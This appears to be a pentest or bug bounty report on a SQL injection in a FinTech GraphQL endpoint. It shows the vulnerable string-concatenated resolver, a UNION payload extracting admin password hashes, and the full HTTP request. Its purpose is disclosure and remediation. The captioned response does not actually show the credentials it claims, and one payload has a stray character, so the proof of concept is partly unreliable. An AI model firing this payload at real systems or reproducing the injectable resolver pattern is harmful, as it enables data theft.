# Title: SQL Injection in GraphQL Query Parameter

- **Platform**: Cobalt
- **Program**: FinTech Platform
- **Severity**: Critical
- **Date**: January 2025
- **Researcher**: David Sopas (dsopas)
- **Bounty**: $2,500

## Summary

A critical SQL injection vulnerability was discovered in a FinTech platform's GraphQL API endpoint during a Cobalt pentest engagement. The `userId` parameter in a GraphQL query was directly concatenated into a SQL query without parameterization, allowing an attacker to extract arbitrary data from the backend PostgreSQL database.

## Technical Details

The application used a GraphQL API layer backed by a PostgreSQL database. The vulnerable resolver function constructed SQL queries by interpolating user-supplied arguments rather than using parameterized queries. The GraphQL schema exposed a `user` query that accepted an `id` argument used to look up user details.

The vulnerable resolver code pattern was similar to:

```javascript
const resolvers = {
  Query: {
    user: (parent, args, context) => {
      const query = `SELECT id, username, email, created_at FROM users WHERE id = ${args.id}`;
      return db.execute(query);
    }
  }
};
```

This allowed arbitrary SQL injection through the `id` argument, even though it was typed as `Int` in the GraphQL schema (the input was not properly coerced or validated server-side before reaching the database layer).

## Steps to Reproduce

1. Identify the GraphQL endpoint (typically `/graphql` or `/api/graphql`)
2. Use a GraphQL introspection query to discover available queries and their parameters
3. Craft a malicious query that injects SQL into the `id` parameter
4. Extract database contents using UNION-based or blind SQL injection

## Proof of Concept

Query the GraphQL endpoint with an injection payload:

```graphql
query {
  user(id: "1 UNION SELECT id, username, password_hash, email FROM admins--)") {
    id
    username
    email
  }
}
```

POST request:

```http
POST /graphql HTTP/1.1
Host: api.fintech.target
Content-Type: application/json

{
  "query": "query { user(id: \"1 UNION SELECT id, username, password_hash, email FROM admins--\") { id username email } }"
}
```

Response revealing admin credentials:

```json
{
  "data": {
    "user": {
      "id": "1",
      "username": "admin",
      "email": "admin@fintech.target"
    }
  }
}
```

Subsequent extraction using boolean-based blind injection confirmed access to the full database schema.

## Impact

- Complete extraction of all database records including user PII and financial data
- Access to password hashes (bcrypt) enabling offline cracking attempts
- Exposure of transaction records and account balances
- Potential privilege escalation via database user permissions

The financial nature of the target made this particularly critical, as attackers could access account balances, transaction histories, and personally identifiable information of all platform users.

## Remediation

- Replace all dynamic SQL construction with parameterized queries (prepared statements)
- Implement strict input validation and type coercion for GraphQL arguments
- Apply the principle of least privilege to database connection accounts
- Deploy a Web Application Firewall (WAF) with GraphQL-aware SQL injection rules
- Conduct regular GraphQL-specific security testing

## References
- https://www.cobalt.io/blog/how-to-write-a-great-vulnerability-report
